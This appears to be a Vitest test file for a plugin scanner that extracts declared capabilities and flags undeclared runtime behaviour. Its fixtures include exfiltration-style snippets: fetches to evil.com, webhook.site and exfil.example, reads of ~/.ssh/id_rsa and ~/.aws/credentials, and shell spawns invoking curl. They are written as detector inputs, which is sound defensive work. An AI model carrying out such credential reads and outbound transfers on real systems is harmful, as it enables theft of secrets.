import { describe, expect, it } from "vitest"
import { mkdirSync, mkdtempSync, writeFileSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { scan } from "../lib/scanner-bin/engine.js"
import type { ScanRequest } from "../lib/scanner-bin/protocol.js"
import { extractCapabilities, aggregateCapabilities, isEmptyManifest } from "../lib/scanner-bin/capability.js"
import { parseSource } from "../lib/scanner-bin/ast.js"
import type { CapabilityManifest } from "../lib/scanner-bin/protocol.js"
import { CapabilityDiffStore, diffKindOf, type ObservedKind } from "../lib/guard/capability-diff.js"

const sf = (code: string) => parseSource(code, "input.js", "js")

function filesRequest(files: string[]): ScanRequest {
  return { kind: "files", files }
}

function tmpDir(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "vet-n1-"))
  for (const [name, content] of Object.entries(files)) {
    mkdirSync(join(dir, name.split("/").slice(0, -1).join("/")), { recursive: true })
    writeFileSync(join(dir, name), content)
  }
  return dir
}

// ---------------------------------------------------------------------------
// 静态能力提取（N1 声明侧）
// ---------------------------------------------------------------------------

describe("extractCapabilities（静态能力清单）", () => {
  it("网络主机：fetch URL 字面量 → hosts + hasNetwork", () => {
    const m = extractCapabilities(sf(`fetch("https://evil.com/steal?k=1")`))
    expect(m.hosts).toContain("evil.com")
    expect(m.hasNetwork).toBe(true)
  })

  it("http.get URL → hosts + hasNetwork", () => {
    const m = extractCapabilities(sf(`require("http").get("http://webhook.site/abc")`))
    expect(m.hosts).toContain("webhook.site")
    expect(m.hasNetwork).toBe(true)
  })

  it("import 声明 → imports（scope 包保留 scope）", () => {
    const m = extractCapabilities(sf(`import axios from "axios"; import fs from "node:fs"; import x from "./local.js"`))
    expect(m.imports).toContain("axios")
    expect(m.imports).not.toContain("node:fs")
    expect(m.imports).not.toContain("./local.js")
    expect(m.imports).toContain("axios")
  })

  it("require 第三方包 → imports；require(http) → hasNetwork；require(child_process) → hasExec", () => {
    const m = extractCapabilities(sf(`const axios = require("axios"); const http = require("http"); const cp = require("child_process")`))
    expect(m.imports).toContain("axios")
    expect(m.hasNetwork).toBe(true)
    expect(m.hasExec).toBe(true)
  })

  it("fs 敏感路径实参 → fsPaths", () => {
    const m = extractCapabilities(sf(`require("fs").readFileSync("/home/u/.ssh/id_rsa")`))
    expect(m.fsPaths).toContain("/home/u/.ssh/id_rsa")
  })

  it("形似路径字面量（敏感段） → fsPaths", () => {
    const m = extractCapabilities(sf(`const p = "~/.aws/credentials"; console.log(p)`))
    expect(m.fsPaths).toContain("~/.aws/credentials")
  })

  it("child_process spawn 命令 → spawnCmds + hasExec", () => {
    const m = extractCapabilities(sf(`require("child_process").spawn("sh", ["-c", "curl x"])`))
    expect(m.spawnCmds).toContain("sh")
    expect(m.hasExec).toBe(true)
  })

  it("字面量里的 shell 下载命令词 → spawnCmds（不误伤普通词）", () => {
    const m = extractCapabilities(sf(`const u = "curl https://evil.com/x"; const url = "https://legit.io"`))
    expect(m.spawnCmds).toContain("curl")
    expect(m.hosts).toContain("evil.com")
    expect(m.hosts).toContain("legit.io")
  })

  it("eval / new Function → hasExec", () => {
    const m = extractCapabilities(sf(`eval("1+1"); const f = new Function("return 1"); f()`))
    expect(m.hasExec).toBe(true)
  })

  it("干净代码 → 空清单", () => {
    const m = extractCapabilities(sf(`const a = 1; export function add(x: number) { return x + 1 }`))
    expect(isEmptyManifest(m)).toBe(true)
  })

  it("aggregate 并集 + 旗标 OR", () => {
    const a: CapabilityManifest = { hosts: ["a.com"], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: true, hasExec: false }
    const b: CapabilityManifest = { hosts: ["b.com"], fsPaths: [".env"], spawnCmds: ["curl"], imports: ["axios"], hasNetwork: false, hasExec: true }
    const agg = aggregateCapabilities([a, b])
    expect(agg.hosts).toEqual(expect.arrayContaining(["a.com", "b.com"]))
    expect(agg.fsPaths).toContain(".env")
    expect(agg.imports).toContain("axios")
    expect(agg.hasNetwork).toBe(true)
    expect(agg.hasExec).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// 扫描报告携带 capabilities（files 模式）
// ---------------------------------------------------------------------------

describe("scan 报告 capabilities", () => {
  it("files 模式 → report.capabilities 聚合", () => {
    const dir = tmpDir({
      "package.json": JSON.stringify({ name: "demo", version: "1.0.0" }),
      "src/index.js": `const http = require("http"); http.get("https://exfil.example/x"); require("fs").readFileSync("/home/u/.ssh/id_rsa")`,
    })
    try {
      const res = scan(filesRequest([join(dir, "package.json"), join(dir, "src/index.js")]))
      expect(res.ok).toBe(true)
      const caps = res.report!.capabilities
      expect(caps).toBeDefined()
      expect(caps!.hosts).toContain("exfil.example")
      expect(caps!.fsPaths).toContain("/home/u/.ssh/id_rsa")
      expect(caps!.hasNetwork).toBe(true)
      // findings 照常产出（capabilities 是附加事实，不改变判定）
      expect(res.report!.findings.length).toBeGreaterThan(0)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  it("code 模式 → 无 capabilities", () => {
    const res = scan({ kind: "code", language: "js", runtime: "host", code: `fetch("https://evil.com")` })
    expect(res.ok).toBe(true)
    expect(res.report!.capabilities).toBeUndefined()
  })
})

// ---------------------------------------------------------------------------
// 运行时差分（N1 观测侧）
// ---------------------------------------------------------------------------

describe("CapabilityDiffStore（观测 → 差分）", () => {
  const store = new CapabilityDiffStore()
  const empty: CapabilityManifest = { hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false }

  it("无静态清单 → 不差分（null）", () => {
    expect(store.observeAndCheck({ plugin: "p1", kind: "net", value: "evil.com" })).toBeNull()
  })

  it("空清单 + 网络观测 → 隐藏能力 red", () => {
    store.registerStatic("p2", empty)
    const h = store.observeAndCheck({ plugin: "p2", kind: "net", value: "evil.com" })
    expect(h).not.toBeNull()
    expect(h!.kind).toBe("net")
    expect(h!.message).toContain("隐藏能力")
    expect(h!.message).toContain("evil.com")
  })

  it("imports 非空 → 任何观测都视为已声明（能力未知保守覆盖）", () => {
    store.registerStatic("p3", { ...empty, imports: ["axios"] })
    expect(store.observeAndCheck({ plugin: "p3", kind: "net", value: "evil.com" })).toBeNull()
    expect(store.observeAndCheck({ plugin: "p3", kind: "spawn", value: "curl" })).toBeNull()
    expect(store.observeAndCheck({ plugin: "p3", kind: "fsRead", value: "/home/u/.ssh/id_rsa" })).toBeNull()
  })

  it("hasNetwork/hosts 声明 + 网络观测 → 覆盖", () => {
    store.registerStatic("p4", { ...empty, hosts: ["a.com"] })
    expect(store.observeAndCheck({ plugin: "p4", kind: "net", value: "a.com" })).toBeNull()
    store.registerStatic("p5", { ...empty, hasNetwork: true })
    expect(store.observeAndCheck({ plugin: "p5", kind: "net", value: "b.com" })).toBeNull()
  })

  it("fsPaths 声明 + fs 观测 → 覆盖；空 fs 声明 + fs 观测 → 隐藏", () => {
    store.registerStatic("p6", { ...empty, fsPaths: [".env"] })
    expect(store.observeAndCheck({ plugin: "p6", kind: "fsRead", value: "/x/.env" })).toBeNull()
    store.registerStatic("p7", empty)
    const h = store.observeAndCheck({ plugin: "p7", kind: "fsMutate", value: "/x/credentials" })
    expect(h).not.toBeNull()
    expect(h!.kind).toBe("fsMutate")
  })

  it("hasExec/spawnCmds 声明 + spawn 观测 → 覆盖；否则隐藏", () => {
    store.registerStatic("p8", { ...empty, hasExec: true })
    expect(store.observeAndCheck({ plugin: "p8", kind: "spawn", value: "dd" })).toBeNull()
    store.registerStatic("p9", { ...empty, spawnCmds: ["sh"] })
    expect(store.observeAndCheck({ plugin: "p9", kind: "spawn", value: "sh" })).toBeNull()
    store.registerStatic("p10", empty)
    expect(store.observeAndCheck({ plugin: "p10", kind: "spawn", value: "curl" })).not.toBeNull()
  })

  it("观测集累积（供 M2 休眠能力展示）", () => {
    const s2 = new CapabilityDiffStore()
    s2.registerStatic("p11", empty)
    s2.observeAndCheck({ plugin: "p11", kind: "net", value: "c.com" })
    s2.observeAndCheck({ plugin: "p11", kind: "net", value: "d.com" })
    const sets = s2.observedSets("p11")
    expect(sets.net).toEqual(expect.arrayContaining(["c.com", "d.com"]))
    expect(sets.net).toHaveLength(2)
  })
})

describe("diffKindOf（T2 alarm kind → 观测类别）", () => {
  it("映射正确；非敏感类返回 null", () => {
    expect(diffKindOf("net-egress")).toBe("net")
    expect(diffKindOf("spawn")).toBe("spawn")
    expect(diffKindOf("fs-read")).toBe("fsRead")
    expect(diffKindOf("fs-probe")).toBe("fsRead")
    expect(diffKindOf("fs-write")).toBe("fsMutate")
    expect(diffKindOf("fs-destroy")).toBe("fsMutate")
    expect(diffKindOf("honeypot")).toBeNull()
    expect(diffKindOf("session")).toBeNull()
  })
  it("观测类型是 ObservedKind 的子集（类型自检）", () => {
    const k: ObservedKind = "net"
    expect(k).toBe("net")
  })
})